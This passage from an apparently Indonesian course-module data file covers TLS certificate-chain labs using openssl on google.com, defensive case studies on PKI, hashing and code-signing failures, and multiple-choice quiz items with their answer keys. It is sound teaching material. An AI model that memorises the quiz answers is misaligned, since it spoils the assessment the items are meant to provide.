        hint: "Subject Alternative Names (SAN) menunjukkan semua domain yang dilindungi sertifikat. Wildcard *.google.com melindungi semua subdomain satu level (mail.google.com, drive.google.com). Perhatikan Issuer — ini menunjukkan CA intermediate yang menerbitkan sertifikat.",
        screenshotNote: "Screenshot output OpenSSL yang menunjukkan detail sertifikat google.com: subject, issuer, tanggal validitas, dan fingerprint SHA-256.",
      },
      {
        title: "Certificate Chain Verification — Chain of Trust",
        description:
          "Verifikasi seluruh certificate chain dari server ke Root CA. Chain of trust memastikan bahwa sertifikat server dipercaya karena di-signed oleh intermediate CA yang di-signed oleh Root CA yang ada di trust store browser/OS. Visualisasikan hierarki: Server Cert → Intermediate CA → Root CA.",
        command: "echo | openssl s_client -connect google.com:443 -servername google.com -showcerts 2>/dev/null | grep -E ' s:| i:' && echo '---' && echo | openssl s_client -connect google.com:443 -servername google.com 2>/dev/null | openssl x509 -noout -verify",
        expectedOutput:
          " s:CN = *.google.com                    ← Server Certificate\n i:CN = GTS CA 1C3                       ← Diterbitkan oleh Intermediate CA\n s:CN = GTS CA 1C3                       ← Intermediate CA Certificate\n i:CN = GTS Root R1                      ← Diterbitkan oleh Root CA\n s:CN = GTS Root R1                      ← Root CA Certificate\n i:CN = GlobalSign Root CA               ← Cross-signed oleh Root CA yang lebih lama",
        hint: "Setiap level 's:' (subject) adalah 'i:' (issuer) dari level di bawahnya. Ini adalah chain of trust. Root CA di baris terakhir harus ada di trust store browser Anda. Jika 'verify' menunjukkan error, berarti chain tidak valid.",
        screenshotNote: "Screenshot output yang menunjukkan certificate chain lengkap dari server cert ke root CA, dengan panah atau anotasi yang menjelaskan hierarki chain of trust.",
        warningNote: "Praktik ini menggunakan server publik (google.com). Jangan menggunakan openssl s_client terhadap sistem tanpa izin untuk tujuan selain analisis sertifikat yang sudah dipublikasi secara publik.",
      },
    ],
    deliverable:
      "Laporan lab (PDF/Word) berisi: (1) Screenshot detail CVE-2021-44228 dengan analisis: CVSS score, jenis kerentanan, dan dampaknya; (2) Screenshot perbandingan hash MD5 vs SHA-256 untuk file yang sama; (3) Screenshot demonstrasi Avalanche Effect dengan dua hash yang sangat berbeda; (4) Screenshot GPG key generation dan key ID; (5) Screenshot proses enkripsi (file .gpg) dan dekripsi (output konten asli); (6) Screenshot analisis sertifikat google.com: subject, issuer, tanggal, fingerprint; (7) Screenshot certificate chain dengan penjelasan hierarki chain of trust; (8) Kesimpulan: mengapa MD5 tidak aman, bagaimana chain of trust bekerja, dan kapan menggunakan enkripsi simetris vs asimetris.",
  },

  // ─── CASE STUDY (default) ────────────────────────────────────────────────────
  caseStudy: {
    title: "Serangan Supply Chain melalui Kompromi Sertifikat Code Signing",
    scenario:
      "Sebuah perusahaan software enterprise terkemuka mengalami supply chain attack: peretas berhasil mencuri private key sertifikat code signing perusahaan tersebut dari build server yang tidak terlindungi. Kunci yang dicuri digunakan untuk menandatangani malware yang kemudian disusupkan ke dalam update rutin software. Ribuan organisasi pelanggan menginstall update yang terinfeksi karena tanda tangan digital valid dan OS tidak memperingatkan pengguna.",
    questions: [
      "Jelaskan mengapa serangan supply chain melalui kompromi sertifikat code signing sangat berbahaya dan sulit dideteksi — apa yang membedakannya dari distribusi malware biasa?",
      "Bagaimana sistem PKI dan Certificate Transparency Log dapat dimanfaatkan untuk mendeteksi sertifikat yang dikompromis? Jelaskan mekanisme Certificate Revocation (CRL/OCSP) dan keterbatasannya dalam kasus ini.",
      "Rancang YARA rule atau Snort rule yang dapat mendeteksi malware ini berdasarkan karakteristik yang diketahui (misalnya: string tertentu, network C2 pattern, atau registry key yang dibuat).",
      "Jelaskan langkah-langkah certificate revocation emergency yang harus dilakukan setelah mengetahui kunci telah dikompromis, dan berapa lama jendela kerentanan yang ada antara kompromi dan revokasi efektif.",
    ],
  },

  // ─── CASE STUDY POOL (15 variants) ──────────────────────────────────────────
  caseStudyPool: [
    // 1. Rumah Sakit
    {
      title: "Penyimpanan Password MD5 Menyebabkan Kebocoran Kredensial Dokter",
      scenario:
        "Sistem informasi rumah sakit swasta menyimpan password akun dokter menggunakan MD5 tanpa salt. Ketika server database diretas, penyerang berhasil memecahkan 95% password dalam 4 jam menggunakan rainbow table yang sudah tersedia di internet. Akun dokter dengan akses ke rekam medis lengkap pasien digunakan oleh penyerang selama seminggu sebelum terdeteksi. Lebih dari 50.000 rekam medis pasien terekspos.",
      questions: [
        "Jelaskan secara teknis mengapa MD5 tanpa salt sangat rentan terhadap rainbow table attack. Apa peran 'salt' dalam membuat penyimpanan password lebih aman?",
        "Bandingkan kekuatan algoritma bcrypt, Argon2id, dan scrypt untuk penyimpanan password — mengapa ketiganya lebih baik dari MD5 atau SHA-256 biasa?",
        "Bagaimana sistem rumah sakit dapat mendeteksi bahwa akun dokter sedang digunakan secara tidak sah? Sebutkan indikator anomali yang harus memicu alert.",
        "Selain mengganti algoritma hashing, langkah mitigasi apa yang harus segera diambil setelah mengetahui bahwa database password telah bocor?",
      ],
    },

    // 2. Bank
    {
      title: "Sertifikat TLS Kadaluarsa Menyebabkan Downtime Layanan Mobile Banking",
      scenario:
        "Bank nasional mengalami downtime layanan mobile banking selama 6 jam akibat sertifikat TLS yang kadaluarsa pada server API produksi. Tim IT tidak mengetahui bahwa sertifikat akan kadaluarsa karena tidak ada sistem monitoring sertifikat, dan email reminder dari CA terfilter sebagai spam. Aplikasi mobile banking menampilkan error 'SSL Certificate Error' kepada jutaan nasabah.",
      questions: [
        "Jelaskan apa yang terjadi secara teknis ketika sertifikat TLS kadaluarsa — bagaimana browser dan aplikasi mobile merespons, dan mengapa layanan langsung terganggu?",
        "Rancang program manajemen siklus hidup sertifikat (Certificate Lifecycle Management) untuk bank — mencakup inventori, monitoring otomatis, renewal, dan prosedur darurat.",
        "Bagaimana Certificate Transparency Log dapat digunakan untuk memonitor semua sertifikat yang diterbitkan untuk domain milik bank, termasuk sertifikat yang mungkin diterbitkan tanpa sepengetahuan tim IT?",
        "Apa perbedaan implikasi keamanan antara sertifikat DV (Domain Validated), OV (Organization Validated), dan EV (Extended Validated) untuk layanan perbankan? Mana yang seharusnya digunakan dan mengapa?",
      ],
    },

    // 3. Pemerintah
    {
      title: "Man-in-the-Middle Attack karena Kegagalan PKI di Portal Pemerintah",
      scenario:
        "Portal layanan publik pemerintah menggunakan sertifikat self-signed yang diterbitkan sendiri (bukan dari CA publik terpercaya), menyebabkan browser menampilkan peringatan keamanan kepada pengguna. Banyak pengguna yang tidak paham mengklik 'Lanjutkan meskipun tidak aman'. Seorang peneliti keamanan kemudian membuktikan bahwa penyerang di jaringan yang sama (seperti Wi-Fi publik) dapat melakukan MITM attack dengan mudah karena pengguna sudah terbiasa mengabaikan peringatan certificate.",
      questions: [
        "Jelaskan mengapa self-signed certificate membuat sistem rentan terhadap MITM attack — apa perbedaan mendasar antara self-signed cert dan cert dari CA publik terpercaya?",
        "Bagaimana HSTS (HTTP Strict Transport Security) dan Certificate Pinning dapat digunakan sebagai lapisan perlindungan tambahan terhadap MITM attack berbasis sertifikat palsu?",
        "Jelaskan program Let's Encrypt dan bagaimana pemerintah dapat menggunakannya untuk mendapatkan sertifikat TLS yang valid dan gratis untuk semua portal layanan publik.",
        "Bagaimana 'certificate warning fatigue' (pengguna yang terbiasa mengabaikan peringatan) merupakan masalah keamanan yang serius dari perspektif behavioral security?",
      ],
    },

    // 4. Universitas
    {
      title: "Kebocoran Kunci Enkripsi Database Nilai Mahasiswa",
      scenario:
        "Sistem informasi akademik sebuah universitas negeri ternama mengenkripsi database nilai menggunakan AES-128 dengan kunci yang disimpan dalam file konfigurasi yang tidak diproteksi di repositori git publik. Developer meng-commit file config termasuk hardcoded encryption key ke GitHub. Setelah terdeteksi oleh bot scanner otomatis, key ditemukan dan digunakan untuk mendekripsi dan memodifikasi nilai mahasiswa.",
      questions: [
        "Jelaskan konsep 'secrets management' dan mengapa menyimpan kunci enkripsi atau password di source code/config file yang di-commit ke repository adalah praktik yang sangat berbahaya.",
        "Bandingkan pendekatan manajemen kunci enkripsi: environment variables, dedicated secrets manager (HashiCorp Vault, AWS Secrets Manager), dan Hardware Security Module (HSM). Mana yang paling aman?",
        "Jika kunci AES-128 sudah terkompromis, data apa yang dapat didekripsi oleh penyerang? Jelaskan implikasi dari AES-128 vs AES-256 dalam konteks keamanan jangka panjang.",
        "Bagaimana universitas dapat melakukan audit terhadap semua repositori kode untuk menemukan secrets yang mungkin sudah ter-commit secara tidak sengaja? Sebutkan tools yang dapat digunakan.",
      ],
    },

    // 5. E-Commerce
    {
      title: "Phishing Menggunakan Sertifikat TLS Palsu yang Menyerupai Platform E-Commerce",
      scenario:
        "Penyerang mendaftarkan domain 'tokopedla.com' (mirip dengan 'tokopedia.com') dan mendapatkan sertifikat TLS DV yang valid dari Let's Encrypt untuk domain tersebut. Situs phishing menampilkan padlock HTTPS di browser, membuat banyak pengguna percaya bahwa situs tersebut aman dan legitimate. Korban memasukkan kredensial akun dan data kartu kredit, yang langsung dieksfiltrasi ke server penyerang.",
      questions: [
        "Jelaskan mengapa padlock HTTPS tidak berarti sebuah website aman atau legitimate — apa yang sebenarnya diverifikasi oleh sertifikat TLS DV yang diterbitkan Let's Encrypt?",
        "Bagaimana teknik homograph attack dan typosquatting domain digunakan oleh penyerang untuk membuat URL yang terlihat mirip dengan domain legitimate?",
        "Apa perbedaan perlindungan yang diberikan oleh DV, OV, dan EV certificate terhadap serangan phishing seperti ini? Mengapa EV sertifikat lebih sulit disalahgunakan penyerang?",
        "Bagaimana e-commerce platform dapat melindungi penggunanya dari phishing berbasis domain lookalike — jelaskan teknis DMARC, BIMI, dan program domain monitoring.",
      ],
    },

    // 6. Manufaktur
    {
      title: "Ransomware Mengeksploitasi Enkripsi Lemah pada Sistem Backup Pabrik",
      scenario:
        "Perusahaan manufaktur otomotif terkena serangan ransomware yang tidak hanya mengenkripsi data produksi tetapi juga berhasil mengenkripsi backup. Investigasi menemukan bahwa backup menggunakan enkripsi RC4 (algoritma stream cipher yang sudah tidak aman) dengan kunci 40-bit yang dapat di-brute force dalam hitungan jam menggunakan hardware modern. Penyerang mendekripsi backup, memverifikasi isinya, lalu mengenkripsi ulang sebelum meninggalkan ransomware.",
      questions: [
        "Jelaskan mengapa RC4 dengan kunci 40-bit tidak lagi aman di era komputasi modern — berapa lama waktu yang dibutuhkan untuk brute force 40-bit key dengan hardware GPU modern?",
        "Rancang strategi backup yang robust menggunakan enkripsi yang kuat (AES-256) dengan implementasi 3-2-1 rule dan immutable backup untuk mencegah ransomware dari mengenkripsi atau memodifikasi backup.",
        "Jelaskan konsep 'cryptographic agility' — mengapa sistem harus dirancang untuk mudah mengganti algoritma enkripsi tanpa refactoring besar saat algoritma lama dinyatakan tidak aman.",
        "Bagaimana threat intelligence tentang kelompok ransomware yang aktif (misalnya LockBit, BlackCat/ALPHV) dapat membantu perusahaan manufaktur mempersiapkan defenses sebelum menjadi target?",
      ],
    },

    // 7. Telekomunikasi
    {
      title: "Intersepsi Komunikasi Akibat Implementasi TLS yang Lemah",
      scenario:
        "Audit keamanan mengungkap bahwa platform VoIP internal sebuah operator telekomunikasi besar masih mendukung TLS 1.0 dan cipher suite yang lemah (RC4, DES, 3DES) untuk backward compatibility dengan perangkat lawas. Peneliti keamanan berhasil melakukan downgrade attack — memaksa server bernegosiasi ke TLS 1.0 dengan RC4 — dan mendekripsi rekaman percakapan eksekutif perusahaan yang sensitive.",
      questions: [
        "Jelaskan TLS downgrade attack secara teknis — bagaimana penyerang dapat memaksa server dan client bernegosiasi ke versi TLS yang lebih lemah meskipun keduanya mendukung versi terbaru?",
        "Sebutkan cipher suite yang aman untuk TLS 1.3 dan jelaskan mengapa TLS 1.3 secara fundamental lebih aman dari TLS 1.2 — fokus pada: forward secrecy, berkurangnya round-trip, dan cipher suite yang diizinkan.",
        "Bagaimana implementasi SSL/TLS dapat diaudit menggunakan tools seperti sslyze, testssl.sh, atau Qualys SSL Labs untuk mengidentifikasi konfigurasi yang lemah sebelum dieksploitasi?",
        "Apa strategi migrasi yang tepat untuk menonaktifkan TLS 1.0/1.1 dan cipher suite lemah tanpa mengganggu operasional layanan yang bergantung pada perangkat lawas?",
      ],
    },

    // 8. Startup
    {
      title: "Startup Fintech Menggunakan Enkripsi Tidak Standar Karya Sendiri",
      scenario:
        "Sebuah startup fintech yang sedang berkembang pesat ditemukan menggunakan algoritma enkripsi buatan sendiri ('proprietary encryption') untuk mengamankan data transaksi nasabah. Founder mengklaim algoritma ini 'lebih aman karena tidak diketahui publik'. Audit keamanan oleh OJK menemukan bahwa algoritma tersebut trivial untuk dipecahkan — menggunakan substitusi sederhana berbasis XOR dengan kunci statis yang tertanam di kode sumber.",
      questions: [
        "Jelaskan prinsip Kerckhoffs dan mengapa 'security through obscurity' (keamanan berbasis kerahasiaan algoritma) adalah pendekatan yang sangat berbahaya dalam kriptografi modern.",
        "Apa yang dimaksud dengan 'snake oil cryptography' dan bagaimana membedakan implementasi kriptografi yang legitimate dari yang tidak terpercaya? Sebutkan tanda-tanda peringatan (red flags).",
        "Mengapa XOR cipher dengan kunci statis bukan enkripsi yang aman? Jelaskan bagaimana known-plaintext attack dapat dengan mudah memecahkan skema enkripsi seperti ini.",
        "Rancang proses evaluasi dan pemilihan library/framework kriptografi yang aman untuk startup fintech yang ingin comply dengan regulasi OJK — kriteria apa yang harus dipenuhi?",
      ],
    },

    // 9. Logistik
    {
      title: "Intersepsi Data Pengiriman akibat Tidak Ada Enkripsi in-Transit",
      scenario:
        "Platform logistik pengiriman yang melayani jutaan paket per hari mentransmisi data sensitif (alamat penerima, nomor HP, isi paket) antara aplikasi mobile driver dan server backend menggunakan HTTP cleartext tanpa enkripsi. Seorang peneliti yang terhubung ke hotspot Wi-Fi yang sama dengan driver berhasil menangkap data pengiriman ratusan paket menggunakan Wireshark dalam satu sesi.",
      questions: [
        "Jelaskan data apa saja yang dapat ditangkap penyerang dari traffic HTTP cleartext platform logistik dan bagaimana data ini dapat disalahgunakan (data exfiltration, penipuan, kejahatan fisik).",
        "Rancang implementasi HTTPS yang benar untuk aplikasi mobile-to-backend: certificate pinning, HSTS, minimum TLS version, dan cipher suite yang diizinkan.",
        "Bagaimana Certificate Pinning mencegah MITM attack bahkan ketika penyerang berhasil mendapatkan sertifikat palsu yang ditandatangani oleh CA yang dipercaya sistem operasi?",
        "Selain enkripsi transport (TLS), enkripsi apa lagi yang diperlukan untuk melindungi data sensitif secara menyeluruh: enkripsi at-rest di database, enkripsi di storage mobile, dan tokenisasi data sensitif.",
      ],
    },

    // 10. PLTU
    {
      title: "Kegagalan Validasi Sertifikat Memungkinkan MITM pada Kontrol Sistem PLTU",
      scenario:
        "Sistem SCADA di Pembangkit Listrik Tenaga Uap menggunakan sertifikat self-signed yang diterbitkan sendiri untuk komunikasi antara Engineering Workstation dan PLC (Programmable Logic Controller). Pada saat audit keamanan, peneliti menemukan bahwa software HMI tidak memvalidasi sertifikat sama sekali — bahkan jika sertifikat yang disajikan tidak valid, koneksi tetap diterima. Ini berarti penyerang dengan posisi MITM dapat menyuntikkan perintah palsu ke PLC tanpa terdeteksi.",
      questions: [
        "Jelaskan bagaimana kegagalan validasi sertifikat (certificate validation bypass) menciptakan kerentanan MITM yang kritis — apa beda antara enkripsi (data tidak dapat dibaca) dan autentikasi (pihak yang berkomunikasi terverifikasi)?",
        "Mengapa lingkungan OT/ICS memiliki tantangan unik dalam implementasi PKI? Sebutkan hambatan-hambatan yang membuat implementasi PKI di lingkungan industri lebih sulit dari di lingkungan IT biasa.",
        "Rancang arsitektur PKI internal (Private CA) yang sesuai untuk lingkungan ICS/SCADA pembangkit listrik, mempertimbangkan kebutuhan: availability 24/7, air-gap, perangkat lawas yang tidak bisa di-update.",
        "Standar IEC 62443 bagian mana yang mengatur persyaratan kriptografi untuk sistem kontrol industri? Jelaskan level Security Level (SL) yang relevan untuk infrastruktur kritikal seperti PLTU.",
      ],
    },

    // 11. TV Nasional
    {
      title: "Kebocoran Tanda Tangan Digital Konten Siaran Menyebabkan Distribusi Konten Palsu",
      scenario:
        "Stasiun TV nasional menggunakan sistem code signing digital untuk memverifikasi keaslian konten siaran (mencegah distribusi konten yang tidak sah melalui jaringan distribusi). Private key code signing tersimpan di server produksi yang terekspos ke internet. Penyerang berhasil mencuri private key dan menggunakannya untuk menandatangani konten deepfake video yang menyebarkan disinformasi, yang kemudian tersebar melalui jaringan distribusi resmi karena tanda tangan digitalnya valid.",
      questions: [
        "Jelaskan prinsip kerja code signing: bagaimana tanda tangan digital memastikan keaslian dan integritas konten, dan mengapa kompromi private key sepenuhnya merusak jaminan tersebut.",
        "Apa best practice untuk penyimpanan private key code signing? Jelaskan peran Hardware Security Module (HSM) dalam melindungi private key dari kompromi bahkan jika server yang menggunakannya dikompromis.",
        "Bagaimana program Certificate Transparency (CT) dan konsep 'append-only log' dapat diaplikasikan untuk auditing distribusi konten digital — memastikan setiap konten yang ditandatangani dapat diverifikasi dan diaudit?",
        "Rancang prosedur key revocation dan recovery emergency untuk kasus kompromi private key code signing pada penyiaran langsung — bagaimana jaringan distribusi diinstruksikan untuk menolak konten yang ditandatangani dengan kunci yang dikompromis?",
      ],
    },

    // 12. Firma Hukum
    {
      title: "Encrypted Email yang Salah Implementasi Mengekspos Komunikasi Klien",
      scenario:
        "Firma hukum terkemuka mengimplementasikan email encryption menggunakan S/MIME, namun konfigurasi yang salah menyebabkan email dikirim dalam dua format sekaligus: encrypted dan cleartext sebagai fallback jika penerima tidak memiliki sertifikat. Akibatnya, semua email yang dikirim ke klien tanpa sertifikat S/MIME dikirim dalam cleartext — termasuk strategi hukum dan informasi klien yang sangat sensitif — selama 8 bulan tanpa diketahui.",
      questions: [
        "Jelaskan perbedaan antara S/MIME dan PGP sebagai standar enkripsi email: bagaimana keduanya menangani manajemen kunci, PKI vs web of trust, dan kompatibilitas antar klien email.",
        "Mengapa konfigurasi 'fallback to plaintext' adalah praktik yang sangat berbahaya untuk email yang mengandung informasi rahasia? Bagaimana seharusnya sistem dikonfigurasi untuk fail securely?",
        "Bagaimana firma hukum dapat mengimplementasikan solusi enkripsi email yang user-friendly untuk klien yang tidak paham teknis, seperti portal enkripsi web atau solusi TLS untuk email server-to-server (STARTTLS/MTA-STS)?",
        "Dari perspektif attorney-client privilege, apa konsekuensi hukum jika terbukti komunikasi dengan klien tidak dienkripsi dengan benar? Bagaimana hal ini berdampak pada kerahasiaan informasi klien yang dilindungi hukum?",
      ],
    },

    // 13. Asuransi
    {
      title: "Threat Intelligence Gap Menyebabkan Keterlambatan Respons Serangan APT",
      scenario:
        "Perusahaan asuransi jiwa menjadi korban serangan APT (Advanced Persistent Threat) selama 4 bulan sebelum terdeteksi. Investigasi forensik menemukan bahwa kelompok APT yang sama telah menyerang dua perusahaan asuransi di negara lain 6 bulan sebelumnya, dengan TTP yang identik. Jika perusahaan berlangganan threat intelligence feed yang mencakup IoC dari serangan sebelumnya, serangan ini seharusnya dapat dideteksi dalam hitungan hari.",
      questions: [
        "Jelaskan siklus hidup threat intelligence (intelligence lifecycle) dan di tahap mana kegagalan terjadi dalam kasus ini — bagaimana seharusnya intelligence dari serangan di negara lain dikumpulkan, dianalisis, dan diterapkan?",
        "Bandingkan sumber-sumber threat intelligence yang tersedia: ISAC industri (FS-ISAC untuk keuangan), commercial threat intel feed (CrowdStrike, Recorded Future), open source (AlienVault OTX, MISP), dan bagaimana menilai ROI masing-masing.",
        "Bagaimana TTPs dari kelompok APT yang sudah diketahui dapat dipetakan ke MITRE ATT&CK Framework untuk menghasilkan detection rules yang lebih efektif dari sekadar IoC-based detection?",
        "Rancang program threat intelligence yang sesuai untuk perusahaan asuransi menengah dengan anggaran terbatas — apa sumber gratis yang dapat dimaksimalkan dan bagaimana threat intel dioperasionalisasikan ke dalam SOC workflow?",
      ],
    },

    // 14. Properti
    {
      title: "Sertifikat Palsu dalam Proses Tanda Tangan Digital Akta Properti",
      scenario:
        "Sebuah platform jual-beli properti digital yang menyediakan layanan penandatanganan akta secara digital (e-signing) mengalami kasus penipuan: seorang penipu berhasil mendapatkan sertifikat digital atas nama penjual properti yang sah dengan memalsukan dokumen identitas kepada CA yang menggunakan proses verifikasi OV (Organization Validated) yang lemah. Sertifikat palsu digunakan untuk menandatangani akta properti palsu senilai Rp 5 miliar.",
      questions: [
        "Jelaskan proses verifikasi identitas yang dilakukan CA untuk menerbitkan sertifikat DV, OV, dan EV — mengapa OV yang lemah dapat dieksploitasi dan apa perbedaan jaminan yang diberikan masing-masing level?",
        "Bagaimana sistem e-signing untuk dokumen legal seharusnya dirancang untuk mencegah penipuan berbasis sertifikat palsu? Apa peran Certification Authority Indonesia (BSrE — Balai Sertifikasi Elektronik BSSN) dalam ekosistem PKI Indonesia?",
        "Jelaskan regulasi tanda tangan elektronik di Indonesia (UU ITE dan PP PSTE) — kapan tanda tangan elektronik memiliki kekuatan hukum yang setara dengan tanda tangan basah?",
        "Bagaimana teknik multi-party verification dan notarisasi digital dapat memperkuat keamanan transaksi properti digital, menambahkan lapisan validasi di luar sekadar PKI?",
      ],
    },

    // 15. Lembaga Zakat
    {
      title: "Kompromi Integritas Database Donasi Zakat akibat Tidak Ada Hash Verification",
      scenario:
        "Lembaga Amil Zakat Nasional (LAZNAS) menemukan bahwa record donasi dalam database mereka telah dimodifikasi secara retroaktif oleh seorang amil yang tidak jujur, mengalihkan seluruh donasi dari muzakki anonim (yang tidak mendapat bukti tertulis) ke rekening pribadinya. Modifikasi terdeteksi setelah audit internal, namun karena database tidak menggunakan mekanisme integritas kriptografis (hash chaining atau audit log yang immutable), tidak dapat dipastikan data mana yang telah dimodifikasi.",
      questions: [
        "Jelaskan konsep integritas data dalam kriptografi dan bagaimana fungsi hash (SHA-256) dapat digunakan untuk membuat audit trail yang tamper-evident untuk setiap record transaksi donasi.",
        "Bagaimana konsep blockchain atau merkle tree dapat diterapkan untuk membuat database donasi zakat yang transparan dan tidak dapat dimanipulasi, memungkinkan muzakki untuk memverifikasi donasi mereka?",
        "Jelaskan prinsip immutable logging dan bagaimana mengimplementasikan audit log yang tahan terhadap modifikasi retroaktif, meskipun dilakukan oleh administrator database sekalipun.",
        "Dari perspektif syariah Islam dan UU PDP, apa kewajiban LAZNAS dalam menjaga integritas, akurasi, dan kerahasiaan data muzakki dan mustahik? Bagaimana kewajiban ini diterjemahkan ke dalam kontrol teknis?",
      ],
    },
  ],

  // ─── QUIZ ────────────────────────────────────────────────────────────────────
  quiz: [
    {
      id: 1,
      question: "Seorang analis SOC menerima laporan bahwa IP address 103.xx.xx.xx telah digunakan sebagai C2 (Command and Control) dalam kampanye APT terbaru. Tipe Threat Intelligence apakah ini dan siapa konsumen utamanya?",
      options: [
        "Strategic Intelligence — untuk CISO dan Board of Directors dalam pengambilan keputusan jangka panjang",
        "Technical Intelligence — untuk security engineer/admin yang mengkonfigurasi firewall dan IDS untuk memblokir IP tersebut",
        "Operational Intelligence — untuk SOC manager dalam memahami kampanye yang sedang aktif",
        "Tactical Intelligence — untuk threat hunter dalam mencari pola TTP di log sistem",
      ],
      answer: "Technical Intelligence — untuk security engineer/admin yang mengkonfigurasi firewall dan IDS untuk memblokir IP tersebut",
      type: "multiple-choice",
    },
    {
      id: 2,
      question: "Berdasarkan 'Pyramid of Pain' (David Bianco), Indicators of Compromise (IoC) mana yang paling SULIT bagi penyerang untuk diubah jika terdeteksi, sehingga memberikan dampak deteksi paling jangka panjang?",
      options: [
        "File Hash (MD5/SHA256) — penyerang cukup recompile untuk menghasilkan hash berbeda",
        "IP Address C2 — penyerang dapat menyewa IP baru atau menggunakan proxy dalam hitungan menit",
        "Domain Name — memerlukan pendaftaran domain baru, tapi relatif mudah dan murah",
        "TTPs (Tactics, Techniques, Procedures) — menggambarkan cara kerja penyerang yang sulit diubah tanpa restrukturisasi total operasi",
      ],
      answer: "TTPs (Tactics, Techniques, Procedures) — menggambarkan cara kerja penyerang yang sulit diubah tanpa restrukturisasi total operasi",
      type: "multiple-choice",
    },
    {
      id: 3,
      question: "Platform e-commerce menyimpan password pengguna menggunakan SHA-256 tanpa salt. Mengapa ini berbahaya, dan algoritma penyimpanan password mana yang seharusnya digunakan?",
      options: [
        "SHA-256 sudah cukup aman; masalahnya bukan algoritmanya tapi panjang password pengguna",
        "Gunakan MD5 — lebih cepat dan sudah terbukti digunakan banyak platform",
        "SHA-256 tanpa salt rentan rainbow table; gunakan bcrypt, Argon2id, atau scrypt yang dirancang lambat dan menggunakan salt secara built-in",
        "Gunakan enkripsi AES-256 — sehingga password dapat di-decrypt dan dibandingkan dengan input pengguna",
      ],
      answer: "SHA-256 tanpa salt rentan rainbow table; gunakan bcrypt, Argon2id, atau scrypt yang dirancang lambat dan menggunakan salt secara built-in",
      type: "multiple-choice",
    },
    {
      id: 4,
      question: "Dalam proses TLS handshake modern (TLS 1.3), komponen kriptografi mana yang digunakan untuk memastikan Perfect Forward Secrecy (PFS) — bahwa sesi masa lalu tidak dapat didekripsi meskipun private key server dikompromis di masa depan?",
      options: [
        "RSA key exchange — private key server digunakan langsung untuk mendekripsi session key",
        "ECDHE (Elliptic Curve Diffie-Hellman Ephemeral) — menghasilkan ephemeral key pair baru untuk setiap sesi yang dibuang setelah sesi berakhir",
        "AES-256-GCM — algoritma enkripsi simetris yang digunakan untuk data setelah handshake",
        "SHA-384 — fungsi hash yang digunakan untuk verifikasi integritas record TLS",
      ],
      answer: "ECDHE (Elliptic Curve Diffie-Hellman Ephemeral) — menghasilkan ephemeral key pair baru untuk setiap sesi yang dibuang setelah sesi berakhir",
      type: "multiple-choice",
    },
    {
      id: 5,
      question: "Browser menolak sertifikat website dengan pesan 'Certificate is not trusted'. Manakah skenario yang BUKAN penyebab pesan error ini?",
      options: [
        "Sertifikat self-signed — tidak diterbitkan oleh CA yang ada di trust store browser",
        "Sertifikat kadaluarsa — melampaui tanggal 'Not After' yang tertera dalam sertifikat",
        "Sertifikat menggunakan SHA-256 signature — algoritma ini sudah deprecated dan tidak dipercaya browser",
        "Sertifikat dicabut (revoked) — CA telah mencabut sertifikat sebelum masa berlaku habis via CRL/OCSP",
      ],
      answer: "Sertifikat menggunakan SHA-256 signature — algoritma ini sudah deprecated dan tidak dipercaya browser",
      type: "multiple-choice",
    },
    {
      id: 6,
      question: "Sebuah peneliti menemukan bahwa dua file berbeda menghasilkan MD5 hash yang identik. Properti kriptografi fungsi hash apa yang telah dilanggar, dan apa implikasi keamanannya?",
      options: [
        "Pre-image resistance — ini berarti hash dapat di-reverse untuk mendapatkan input asli",
        "Collision resistance — dua input berbeda menghasilkan output sama, memungkinkan substitusi file jahat dengan hash yang cocok",
        "Second pre-image resistance — attacker menemukan input yang berbeda dengan hash sama untuk INPUT YANG DIKETAHUI",
        "Avalanche effect — perubahan kecil pada input tidak menghasilkan perubahan besar pada output",
      ],
      answer: "Collision resistance — dua input berbeda menghasilkan output sama, memungkinkan substitusi file jahat dengan hash yang cocok",
      type: "multiple-choice",
    },
    {
      id: 7,
      question: "Dalam PKI, dokumen apa yang berisi informasi tentang sertifikat yang telah dicabut sebelum masa berlaku habis, yang di-publish oleh Certificate Authority secara periodik?",
      options: [
        "CSR (Certificate Signing Request) — request dari entitas untuk mendapatkan sertifikat baru",
        "CRL (Certificate Revocation List) — daftar sertifikat yang dicabut, dipublikasikan CA secara periodik",
        "OCSP Response — respons real-time status sertifikat dari OCSP responder",
        "X.509 Certificate — dokumen yang berisi public key dan identitas subjek",
      ],
      answer: "CRL (Certificate Revocation List) — daftar sertifikat yang dicabut, dipublikasikan CA secara periodik",
      type: "multiple-choice",
    },
    {
      id: 8,
      question: "Penyerang berhasil mencuri private key sertifikat code signing dari sebuah software vendor. Apa dampak terburuk yang dapat dilakukan penyerang dengan private key tersebut?",
      options: [
        "Mendekripsi komunikasi TLS masa lalu yang menggunakan kunci tersebut",
        "Menandatangani malware dengan identitas vendor yang sah sehingga OS dan antivirus tidak mencurigainya",
        "Memalsukan sertifikat digital tanpa melibatkan CA manapun",
        "Mengakses server vendor karena private key sama dengan password server",
      ],
      answer: "Menandatangani malware dengan identitas vendor yang sah sehingga OS dan antivirus tidak mencurigainya",
      type: "multiple-choice",
    },
    {
      id: 9,
      question: "Jelaskan perbedaan antara Symmetric Encryption, Asymmetric Encryption, dan Hashing. Berikan satu contoh penggunaan nyata untuk masing-masing dalam konteks keamanan web (HTTPS). Mengapa HTTPS menggunakan kombinasi ketiganya?",
      answer: "Symmetric Encryption (misalnya AES-256-GCM) menggunakan satu kunci yang sama untuk enkripsi dan dekripsi. Kelebihannya: sangat cepat, efisien untuk enkripsi data dalam jumlah besar. Kelemahannya: masalah key distribution (bagaimana berbagi kunci secara aman?). Dalam HTTPS: digunakan untuk mengenkripsi data aktual (payload HTTP) setelah handshake selesai. Asymmetric Encryption (misalnya RSA atau ECDHE) menggunakan pasangan kunci publik/privat berbeda. Kelebihannya: memecahkan masalah key distribution — public key dapat dibagikan bebas. Kelemahannya: lambat (100-1000x lebih lambat dari symmetric), tidak praktis untuk data besar. Dalam HTTPS: digunakan selama TLS handshake untuk key exchange (ECDHE) dan verifikasi identitas server (RSA signature). Hashing (misalnya SHA-256) menghasilkan digest tetap dari input sembarang — one-way, tidak bisa di-reverse. Kelebihannya: sangat cepat, deterministic, membuktikan integritas. Kelemahannya: tidak dapat digunakan untuk enkripsi/dekripsi. Dalam HTTPS: digunakan untuk HMAC verifikasi integritas setiap TLS record (memastikan data tidak dimodifikasi in-transit) dan dalam tanda tangan digital sertifikat (CA menandatangani hash sertifikat). HTTPS menggunakan kombinasi ketiganya karena masing-masing memiliki kekuatan berbeda: Asymmetric untuk key exchange yang aman dan autentikasi identitas server (meskipun lambat, hanya dilakukan sekali saat handshake); 